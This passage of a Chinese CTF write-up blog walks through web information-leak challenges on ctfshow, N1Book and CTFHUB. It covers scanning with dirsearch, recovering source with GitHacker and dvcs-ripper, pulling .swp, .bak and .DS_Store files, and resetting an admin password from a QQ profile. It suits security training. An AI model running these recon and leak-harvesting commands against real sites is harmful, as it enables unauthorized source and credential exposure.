文件泄露</h5><div class="note info flat"><p>.DS_Store是<strong>Mac</strong>下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p></div><p>使用工具<strong>ds_store_exp</strong></p><p><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></p><h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><p>响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><div class="table-container"><table><thead><tr><th style="text-align:left">分类</th><th style="text-align:left">分类描述</th></tr></thead><tbody><tr><td style="text-align:left">1**</td><td style="text-align:left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td style="text-align:left">2**</td><td style="text-align:left">成功，操作被成功接收并处理</td></tr><tr><td style="text-align:left">3**</td><td style="text-align:left">重定向，需要进一步的操作以完成请求</td></tr><tr><td style="text-align:left">4**</td><td style="text-align:left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td style="text-align:left">5**</td><td style="text-align:left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table></div><p>HTTP状态码列表:</p><div class="table-container"><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">状态码英文名称</th><th style="text-align:left">中文描述</th></tr></thead><tbody><tr><td style="text-align:left">100</td><td style="text-align:left">Continue</td><td style="text-align:left">继续。客户端应继续其请求</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">Switching Protocols</td><td style="text-align:left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">200</td><td style="text-align:left">OK</td><td style="text-align:left">请求成功。一般用于GET与POST请求</td></tr><tr><td style="text-align:left">201</td><td style="text-align:left">Created</td><td style="text-align:left">已创建。成功请求并创建了新的资源。这通常是在 POST 请求，或是某些 PUT 请求之后返回的响应。</td></tr><tr><td style="text-align:left">202</td><td style="text-align:left">Accepted</td><td style="text-align:left">已接受。已经接受请求，但未处理完成</td></tr><tr><td style="text-align:left">203</td><td style="text-align:left">Non-Authoritative Information</td><td style="text-align:left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td style="text-align:left">204</td><td style="text-align:left">No Content</td><td style="text-align:left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td style="text-align:left">205</td><td style="text-align:left">Reset Content</td><td style="text-align:left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td style="text-align:left">206</td><td style="text-align:left">Partial Content</td><td style="text-align:left">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">300</td><td style="text-align:left">Multiple Choices</td><td style="text-align:left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td style="text-align:left">301</td><td style="text-align:left">Moved Permanently</td><td style="text-align:left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td style="text-align:left">302</td><td style="text-align:left">Found</td><td style="text-align:left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td style="text-align:left">303</td><td style="text-align:left">See Other</td><td style="text-align:left">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td style="text-align:left">304</td><td style="text-align:left">Not Modified</td><td style="text-align:left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td style="text-align:left">305</td><td style="text-align:left">Use Proxy</td><td style="text-align:left">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td style="text-align:left">306</td><td style="text-align:left">Unused</td><td style="text-align:left">已经被废弃的HTTP状态码</td></tr><tr><td style="text-align:left">307</td><td style="text-align:left">Temporary Redirect</td><td style="text-align:left">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">400</td><td style="text-align:left">Bad Request</td><td style="text-align:left">客户端请求的语法错误，服务器无法理解</td></tr><tr><td style="text-align:left">401</td><td style="text-align:left">Unauthorized</td><td style="text-align:left">请求要求用户的身份认证</td></tr><tr><td style="text-align:left">402</td><td style="text-align:left">Payment Required</td><td style="text-align:left">保留，将来使用</td></tr><tr><td style="text-align:left">403</td><td style="text-align:left">Forbidden</td><td style="text-align:left">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td style="text-align:left">404</td><td style="text-align:left">Not Found</td><td style="text-align:left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td style="text-align:left">405</td><td style="text-align:left">Method Not Allowed</td><td style="text-align:left">客户端请求中的方法被禁止</td></tr><tr><td style="text-align:left">406</td><td style="text-align:left">Not Acceptable</td><td style="text-align:left">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td style="text-align:left">407</td><td style="text-align:left">Proxy Authentication Required</td><td style="text-align:left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td style="text-align:left">408</td><td style="text-align:left">Request Time-out</td><td style="text-align:left">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td style="text-align:left">409</td><td style="text-align:left">Conflict</td><td style="text-align:left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td style="text-align:left">410</td><td style="text-align:left">Gone</td><td style="text-align:left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td style="text-align:left">411</td><td style="text-align:left">Length Required</td><td style="text-align:left">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td style="text-align:left">412</td><td style="text-align:left">Precondition Failed</td><td style="text-align:left">客户端请求信息的先决条件错误</td></tr><tr><td style="text-align:left">413</td><td style="text-align:left">Request Entity Too Large</td><td style="text-align:left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td style="text-align:left">414</td><td style="text-align:left">Request-URI Too Large</td><td style="text-align:left">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td style="text-align:left">415</td><td style="text-align:left">Unsupported Media Type</td><td style="text-align:left">服务器无法处理请求附带的媒体格式</td></tr><tr><td style="text-align:left">416</td><td style="text-align:left">Requested range not satisfiable</td><td style="text-align:left">客户端请求的范围无效</td></tr><tr><td style="text-align:left">417</td><td style="text-align:left">Expectation Failed</td><td style="text-align:left">服务器无法满足Expect的请求头信息</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">500</td><td style="text-align:left">Internal Server Error</td><td style="text-align:left">服务器内部错误，无法完成请求</td></tr><tr><td style="text-align:left">501</td><td style="text-align:left">Not Implemented</td><td style="text-align:left">服务器不支持请求的功能，无法完成请求</td></tr><tr><td style="text-align:left">502</td><td style="text-align:left">Bad Gateway</td><td style="text-align:left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td style="text-align:left">503</td><td style="text-align:left">Service Unavailable</td><td style="text-align:left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td style="text-align:left">504</td><td style="text-align:left">Gateway Time-out</td><td style="text-align:left">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td style="text-align:left">505</td><td style="text-align:left">HTTP Version not supported</td><td style="text-align:left">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table></div><h2 id="ctfshow-web1-20"><a href="#ctfshow-web1-20" class="headerlink" title="ctfshow web1-20"></a>ctfshow web1-20</h2><h3 id="web1（注释）"><a href="#web1（注释）" class="headerlink" title="web1（注释）"></a>web1（注释）</h3><p>按F12调出页面源码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822233537054.png" alt="image-20230822233537054"></p><p>可以发现flag就放在html注释中</p><h3 id="web2（JS禁用F12）"><a href="#web2（JS禁用F12）" class="headerlink" title="web2（JS禁用F12）"></a>web2（JS禁用F12）</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822233903624.png" alt="image-20230822233903624"></p><p>页面显示无法查看源代码，F12按键和右键均失效</p><p>考虑到可能是被js给禁用了</p><p>方法一：</p><p>此处我们在url前加上<code>view-source:</code>直接查看页面源码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822234638787.png" alt="image-20230822234638787"></p><p>在源码中我们能看到js确实禁用了右键和f12等功能</p><p>flag仍然藏在注释中</p><p>方法二：</p><p>由于是JavaScript导致的禁用，那么我们可以直接在浏览器中关闭JavaScript的功能</p><p>以edge浏览器为例，在设置中搜索JavaScript，在阻止栏中添加我们想查看源码的站点url</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822235233238.png" alt="image-20230822235233238"></p><p>此时F12功能又恢复了</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822235306809.png" alt="image-20230822235306809"></p><h3 id="web3（响应体）"><a href="#web3（响应体）" class="headerlink" title="web3（响应体）"></a>web3（响应体）</h3><p>根据题目提示，使用burpsuite进行抓包</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230822235930989.png" alt="image-20230822235930989"></p><p>发现flag藏在响应体中</p><h3 id="web4（robots-txt）"><a href="#web4（robots-txt）" class="headerlink" title="web4（robots.txt）"></a>web4（robots.txt）</h3><p>题目提示robot，我们直接在网站地址后加<code>/robots.txt</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230823000254654.png" alt="image-20230823000254654"></p><p>不让爬的文件中有一个flag命名的txt文件，flag应该就在其中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230823000401098.png" alt="image-20230823000401098"></p><h3 id="web5（phps源码）"><a href="#web5（phps源码）" class="headerlink" title="web5（phps源码）"></a>web5（phps源码）</h3><p>题目提示phps源码</p><div class="note info flat"><p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p></div><p>在题目未给出提示时，我们也可以通过扫描后台来发现遗留的phps文件</p><p>在url后加上<code>/index.phps</code>下载phps源码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230823123851826.png" alt="image-20230823123851826"></p><p>用vscode打开，flag就在phps源码中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230823123944208.png" alt="image-20230823123944208"></p><h3 id="web6（备份文件）"><a href="#web6（备份文件）" class="headerlink" title="web6（备份文件）"></a>web6（备份文件）</h3><p>使用dirsearch扫描，发现有备份文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824165250185.png" alt="image-20230824165250185"></p><p>手动在url后添加<code>www.zip</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824163043277.png" alt="image-20230824163043277"></p><p>得到备份文件</p><p>解压缩后得到flag文件，发现包含的flag格式不符，考虑可能是提示文件名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824163126450.png" alt="image-20230824163126450"></p><p>在url后加上<code>fl000g.txt</code>得到最终flag</p><h3 id="web7（git泄漏）"><a href="#web7（git泄漏）" class="headerlink" title="web7（git泄漏）"></a>web7（git泄漏）</h3><p>使用dirsearch扫描，发现/.git/泄露</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824165840414.png" alt="image-20230824165840414"></p><p>访问该地址后得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824170238593.png" alt="image-20230824170238593"></p><h3 id="web8（svn泄漏）"><a href="#web8（svn泄漏）" class="headerlink" title="web8（svn泄漏）"></a>web8（svn泄漏）</h3><p>使用dirsearch扫描，发现/.svn/泄露</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824170701799.png" alt="image-20230824170701799"></p><p>访问该地址后得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824170741244.png" alt="image-20230824170741244"></p><h3 id="web9（vim备份）"><a href="#web9（vim备份）" class="headerlink" title="web9（vim备份）"></a>web9（vim备份）</h3><div class="note info flat"><p>使用vim编辑器编写<code>filename</code>文件时，会有一个<code>.filename.swp</code>文件产生，它是隐藏文件。如果编写文件时正常退出，则该swp文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出时未能保存的文件，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p></div><p>本题的描述显然是暗示考点是Vim泄漏</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824171932488.png" alt="image-20230824171932488"></p><p>而需要修改网页，则需要修改index.php文件</p><p>尝试访问<code>index.php.swp</code>，下载得到swp文件，打开后得到flag：</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824172248701.png" alt="image-20230824172248701.png"></p><h3 id="web10（cookie）"><a href="#web10（cookie）" class="headerlink" title="web10（cookie）"></a>web10（cookie）</h3><div class="note primary flat"><p>查看网页cookie的方式有以下几种：</p><ol><li><p>在浏览器的控制台中输入<code>javascript:alert(document.cookie)</code>，打印 cookie信息</p></li><li><p>以本人使用的edge浏览器为例</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824180722858.png" alt="image-20230824180722858"></p><p>点击url栏旁的关于信息，即可查看当前网页使用的Cookie</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824180814189.png" alt="image-20230824180814189"></p></li></ol></div><p>本题直接在控制台打印cookie信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824180955706.png" alt="image-20230824180955706"></p><p>得到flag的url编码</p><h3 id="web11（域名解析记录）"><a href="#web11（域名解析记录）" class="headerlink" title="web11（域名解析记录）"></a>web11（域名解析记录）</h3><p>本题使用在线工具查询相应站点的域名解析记录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824183447166.png" alt="image-20230824183447166"></p><p>在TXT记录中得到flag</p><h3 id="web12（社工）"><a href="#web12（社工）" class="headerlink" title="web12（社工）"></a>web12（社工）</h3><p>用dirsearch扫到admin这个目录，应该是有登录界面</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824184637831.png" alt="image-20230824184637831"></p><p>根据题目提示，密码应该就藏在页面当中</p><p>尝试页面下方的电话号码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824184719968.png" alt="image-20230824184719968"></p><p>成功登录</p><h3 id="web13（技术文档）"><a href="#web13（技术文档）" class="headerlink" title="web13（技术文档）"></a>web13（技术文档）</h3><p>页面底部留有技术文档document</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824195405357.png" alt="image-20230824195405357"></p><p>按照指示登录<code>http://http://f78fddce-9ace-4612-a3d3-82c302c63f6e.challenge.ctf.show/system1103/login.php</code>得到flag</p><h3 id="web14（网页编辑功能泄漏）"><a href="#web14（网页编辑功能泄漏）" class="headerlink" title="web14（网页编辑功能泄漏）"></a>web14（网页编辑功能泄漏）</h3><p>用dirsearch扫出editor目录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824200612347.png" alt="image-20230824200612347"></p><p>访问editor，进入一个提交页面</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824200749543.png" alt="image-20230824200749543"></p><p>发现有插入文件的功能，那我们就可以直接服务器上的文件了</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824201030486.png" alt="image-20230824201030486"></p><p>linux下的特殊目录：<strong>/var/www/html</strong>，把静态网页文件放到这个目录下就可以通过IP很方便的访问，</p><p>如果要访问 /var/www/html/myfolder/test.html</p><p>我在浏览器地址栏输入 <a href="http://[ip]/myfolder/test.html就行了。">http://[ip]/myfolder/test.html就行了。</a></p><div class="note warning flat"><p>不过这个便利的功能并不是linux操作系统自带的，需要启用httpd服务才行。</p></div><p>猜测本题的网页在var文件夹下</p><p>顺利按/var/www/html的路径找到源代码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824201641383.png" alt="image-20230824201641383"></p><p>在nothinghere下找到flag</p><h3 id="web15（社工）"><a href="#web15（社工）" class="headerlink" title="web15（社工）"></a>web15（社工）</h3><p>用dirsearch扫完发现存在管理员登录入口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824204443207.png" alt="image-20230824204443207"></p><p>该后台登录系统存在<strong>忘记密码</strong>功能</p><p>同时页面底部也泄露了具体邮箱</p><p>第一个问题是在哪个城市</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824204648479.png" alt="image-20230824204648479"></p><p>搜索QQ号，通过QQ上的资料确定所在地在西安</p><p>提交后显示密码已重置</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824205004461.png" alt="image-20230824205004461"></p><p>重新登录并得到flag</p><h3 id="web16（php探针）"><a href="#web16（php探针）" class="headerlink" title="web16（php探针）"></a>web16（php探针）</h3><p>根据题目的提示，网站应该是遗留了php探针</p><p>经过尝试成功访问/tz.php</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824211804059.png" alt="image-20230824211804059"></p><p>发现phpinfo处是灰色链接，点击进入phpinfo</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824212029045.png" alt="image-20230824212029045"></p><p>查找flag属性并找到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824212017652.png" alt="image-20230824212017652"></p><h3 id="web17（sql备份）"><a href="#web17（sql备份）" class="headerlink" title="web17（sql备份）"></a>web17（sql备份）</h3><p>用dirsearch扫出sql备份文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824215859540.png" alt="image-20230824215859540"></p><p>下载后打开，找到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824220020864.png" alt="image-20230824220020864"></p><h3 id="web18（查阅js源码）"><a href="#web18（查阅js源码）" class="headerlink" title="web18（查阅js源码）"></a>web18（查阅js源码）</h3><p>看到这种游戏类型的题目，大概率是不能手动过关的，只能从修改规则上入手</p><p>打开js源码，找到游戏过关相关的代码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824220847569.png" alt="image-20230824220847569"></p><p>发现如果达到100分，会弹窗一段<strong>Unicode编码</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824221505621.png" alt="image-20230824221505621"></p><p>解码后得到<code>你赢了，去幺幺零点皮爱吃皮看看</code></p><p>在url后加上<code>/110.php</code>得到flag</p><h3 id="web19（密码泄露）"><a href="#web19（密码泄露）" class="headerlink" title="web19（密码泄露）"></a>web19（密码泄露）</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824223141008.png" alt="image-20230824223141008"></p><p>分享加密原理后，解密注释中泄漏的密文</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824223207659.png" alt="image-20230824223207659"></p><p>使用其登录后成功获得flag</p><h3 id="web20（mdb泄漏）"><a href="#web20（mdb泄漏）" class="headerlink" title="web20（mdb泄漏）"></a>web20（mdb泄漏）</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230824224302056.png" alt="image-20230824224302056"></p><p>扫出/db/db.mdb数据库文件</p><p>下载后使用记事本打开并查找flag</p><h2 id="从0到1"><a href="#从0到1" class="headerlink" title="从0到1"></a>从0到1</h2><h3 id="常见的搜集（robots、vim、gedit）"><a href="#常见的搜集（robots、vim、gedit）" class="headerlink" title="常见的搜集（robots、vim、gedit）"></a>常见的搜集（robots、vim、gedit）</h3><p>尝试常规的信息收集方法</p><p>首先是robots.txt</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230825133458156.png" alt="image-20230825133458156"></p><p>得到flag目录</p><p>获得flag1前半段<code>n1book&#123;info_1</code></p><p>测试是否存在vim备份文件，尝试<code>/.index.php.swp</code></p><p>下载得到_index.php.swp文件</p><p>其中有后半段flag<code>p0rtant_hack&#125;</code></p><p>测试是否存在gedit备份文件，尝试<code>/index.php~</code></p><p>得到flag中段<code>s_v3ry_im</code></p><h3 id="粗心的小李（git泄漏）"><a href="#粗心的小李（git泄漏）" class="headerlink" title="粗心的小李（git泄漏）"></a>粗心的小李（git泄漏）</h3><p>题目提示git泄漏，考虑git泄露时的三种场景</p><p>首先是常规git泄漏</p><p>使用GitHacker恢复源码</p><p><code>githacker --url http://2f16f0e7-c2bf-4ca1-95dd-37e0cf03bd0a.node4.buuoj.cn:81/.git/ --output-folder G:\CTF\Web\工具\GitHacker\result</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827161744780.png" alt="image-20230827161744780"></p><p>得到源码index.html</p><p>打开后得到flag</p><h2 id="CTFHUB-信息泄漏"><a href="#CTFHUB-信息泄漏" class="headerlink" title="CTFHUB 信息泄漏"></a>CTFHUB 信息泄漏</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826224503145.png" alt="image-20230826224503145"></p><p>点击开始寻找flag，发现嵌套了非常多层目录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826224537449.png" alt="image-20230826224537449"></p><p>将flag_in_here添加到爆破字典中</p><p>使用dirsearch进行递归目录扫描，设置最多3层：<code>python dirsearch.py -u http://challenge-f27080f1e67b7730.sandbox.ctfhub.com:10800 -i 200,300-399 -r -R 3</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826225758115.png" alt="image-20230826225758115"></p><p>扫到flag文件，访问<code>/flag_in_here/2/4/flag</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826225859690.png" alt="image-20230826225859690"></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826230208430.png" alt="image-20230826230208430"></p><p>点击查看phpinfo，查找flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826230259777.png" alt="image-20230826230259777"></p><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>使用自定义脚本扫描备份文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826231038358.png" alt="image-20230826231038358"></p><p>下载www.zip，解压后得到如下文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826231124216.png" alt="image-20230826231124216"></p><p>txt中显示where is flag ??</p><p>尝试在url添加<code>/flag_115928996.txt</code>，得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826231713234.png" alt="image-20230826231713234"></p><h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>使用自定义脚本扫描得到index.php.bak</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826232431817.png" alt="image-20230826232431817"></p><p>下载后得到flag</p><h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>参考vim泄漏原理，在url后加上<code>/.index.php.swp</code></p><p>下载备份文件后得到flag</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>在url后加上<code>/.DS_Store</code>，下载得到备份文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230826233812659.png" alt="image-20230826233812659"></p><p>根据提示在url后加上<code>/1626d67afe2fee89348ecaaff46381dc.txt</code>得到flag</p><h3 id="Git泄漏"><a href="#Git泄漏" class="headerlink" title="Git泄漏"></a>Git泄漏</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>使用GitHacker扫描站点的.git文件，生成源码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162001359.png" alt="image-20230827162001359"></p><p>源代码目录如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162030953.png" alt="image-20230827162030953"></p><p>50x.html界面提示log日志</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827002323089.png" alt="image-20230827002323089"></p><p>执行<code>git log</code>命令</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827005434467.png" alt="image-20230827005434467"></p><p>使用<code>git diff 1355add0bcf41982c67f591f699f4296b311bd07</code>进行回滚</p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827005719871.png" alt="image-20230827005719871"></p><h4 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h4><p>使用GitHacker恢复源码<code>githacker --url http://challenge-ceb412434853a026.sandbox.ctfhub.com:10800/.git/ --output-folder G:\CTF\Web\工具\GitHacker\result</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162444014.png" alt="image-20230827162444014"></p><p>得到源码目录如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162513656.png" alt="image-20230827162513656"></p><p>执行git log查看版本</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162658641.png" alt="image-20230827162658641"></p><p>执行<code>git diff HEAD 5aff97711513ad7db6c19d6222860240e91e7491</code>对比与add flag版本的区别</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827162924216.png" alt="image-20230827162924216"></p><p>此时有两种解题方法：</p><ol><li><p>按照题意使用<code>git stash pop</code>恢复文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827163722208.png" alt="image-20230827163722208"></p></li><li><p>执行<code>git reset HEAD^</code>回到上一个add flag的版本，此时删掉的文件也回来了</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827163605196.png" alt="image-20230827163605196"></p></li></ol><p>flag就在恢复的txt文件中</p><h4 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h4><p>使用GitHacker恢复源码<code>githacker --url http://challenge-1f42ffb3a63e3f3b.sandbox.ctfhub.com:10800/.git/ --output-folder G:\CTF\Web\工具\GitHacker\result</code></p><p>源码目录如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827164306940.png" alt="image-20230827164306940"></p><p>flag在txt文件中</p><h3 id="SVN泄漏"><a href="#SVN泄漏" class="headerlink" title="SVN泄漏"></a>SVN泄漏</h3><p>在kali中使用dvcs-ripper工具</p><p>在result目录下执行<code>../rip-svn.pl -v -u http://challenge-461ad970cc7dbf6b.sandbox.ctfhub.com:10800/.svn/</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827170209722.png" alt="image-20230827170209722"></p><p>得到的源码在新建的result文件夹中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827170310567.png" alt="image-20230827170310567"></p><p>扫描后发现.svn文件夹</p><p>进入后再次扫描，发现数据库文件wc.db</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827170422106.png" alt="image-20230827170422106"></p><p>执行<code>cat wc.db | grep -a flag</code>在其中寻找flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230827172604750.png" alt="image-20230827172604750"></p><div class="note info flat"><p><strong>grep指令</strong></p><p>grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 <strong>-</strong>，则 grep 指令会从标准输入设备读取数据。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [options] pattern [files]</span><br></pre></td></tr></table></figure><ul><li>pattern - 表示要查找的字符串或正则表达式。</li><li>files - 表示要查找的文件名，可以同时查找多个文件，如果省略 files 